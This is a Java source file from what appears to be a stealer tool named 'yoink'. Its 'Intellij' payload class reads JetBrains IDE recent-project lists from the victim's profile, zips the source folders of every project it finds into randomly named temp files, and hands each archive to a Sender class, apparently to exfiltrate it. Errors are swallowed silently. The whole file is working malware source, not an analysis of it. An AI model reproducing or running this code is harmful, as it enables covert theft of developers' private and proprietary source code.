package me.perry.yoink.payload.impl;

import me.perry.yoink.payload.Payload;
import me.perry.yoink.payload.Sender;
import me.perry.yoink.util.FileUtil;

import java.io.File;
import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.Arrays;
import java.util.Scanner;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;

public final
class Intellij implements Payload {
    @Override
    public
    void execute () {
        String workspaces = getIntellijWorkspaces();
        assert workspaces != null;
        Arrays.stream(workspaces.split("\n"))
                .forEach(s -> {
                    try {
                        File file = new File(System.getenv("TEMP") + "\\" + FileUtil.randomString());
                        pack(s ,file.getPath());
                        Sender.send(file);
                    } catch (Exception ignored) {
                    }
                });
    }

    private
    void pack (String sourceDirPath ,String zipFilePath) throws IOException {
        Path p = Files.createFile(Paths.get(zipFilePath));
        try (ZipOutputStream zs = new ZipOutputStream(Files.newOutputStream(p))) {
            Path pp = Paths.get(sourceDirPath);
            Files.walk(pp)
                    .filter(path -> ! Files.isDirectory(path))
                    .filter(path -> path.toFile().getPath().contains("src"))
                    .forEach(path -> {
                        ZipEntry zipEntry = new ZipEntry(pp.relativize(path).toString());
                        try {
                            zs.putNextEntry(zipEntry);
                            Files.copy(path ,zs);
                            zs.closeEntry();
                        } catch (IOException ignored) {
                        }
                    });
        }
    }

    private
    String getIntellijWorkspaces () {
        try {
            File folder = new File(System.getProperty("user.home") + "/AppData/Roaming/JetBrains/");
            if (folder.exists()) {
                StringBuilder sb = new StringBuilder();
                File[] var2 = folder.listFiles();

                assert var2 != null;
                for (File folders : var2) {
                    if (folders != null && folders.isDirectory()) {
                        File file = new File(folders.getAbsolutePath() + "/options/recentProjects.xml");
                        if (file.exists()) {
                            Scanner scanner = new Scanner(file ,"UTF-8");
                            boolean log = false;

                            while (scanner.hasNextLine()) {
                                String line = scanner.nextLine();
                                if (log) {
                                    if (line.contains("</list>")) log = false;
                                    else if (! line.contains("<list>")) {
                                        line = line.substring(line.indexOf("\"") + 1);
                                        line = line.substring(0 ,line.lastIndexOf("/>") - 2);
                                        sb.append(line);

                                        try {
                                            File file1 = new File(line);
                                            if (file1.exists()) {
                                                String size = file1.isDirectory() ? getFolderSize(file1) : getFileSize(file1);
                                                if (size != null) {
                                                    sb.append(" ");
                                                    sb.append(size);
                                                }
                                            }
                                        } catch (Exception ignored) {
                                        }
                                        sb.append("\n");
                                    }
                                } else if (line.contains("<option name=\"recentPaths\">")) {
                                    log = true;
                                }
                            }

                            scanner.close();
                        }
                    }
                }

                return sb.toString().replace("\u0024USER_HOME\u0024" ,System.getProperty("user.home")).replace("/" ,"\\");
            } else {
                return null;
            }
        } catch (Exception var13) {
            return null;
        }
    }

    private
    String getFileSize (File file) {
        long bytes = file.length();
        long kilobytes = bytes / 1024L;
        long megabytes = kilobytes / 1024L;
        if (megabytes > 0L) {
            return String.format("%,d MB" ,megabytes);
        } else {
            return kilobytes > 0L ? String.format("%,d KB" ,kilobytes) : String.format("%,d B" ,bytes);
        }
    }

    private
    long getFolderSizeData (File f) {
        long ret = 0L;
        File[] var3 = f.listFiles();

        assert var3 != null;
        for (File file : var3) {
            if (file != null) {
                if (file.isDirectory()) ret += getFolderSizeData(file);
                else ret += file.length();
            }
        }

        return ret;
    }

    private
    String getFolderSize (File folder) {
        try {
            if (folder != null && folder.isDirectory()) {
                long bytes = getFolderSizeData(folder);
                long kilobytes = bytes / 1024L;
                long megabytes = kilobytes / 1024L;
                if (megabytes > 0L) {
                    return String.format("%,d MB" ,megabytes);
                } else {
                    return kilobytes > 0L ? String.format("%,d KB" ,kilobytes) : String.format("%,d B" ,bytes);
                }
            } else {
                return null;
            }
        } catch (Exception var7) {
            return null;
        }
    }
}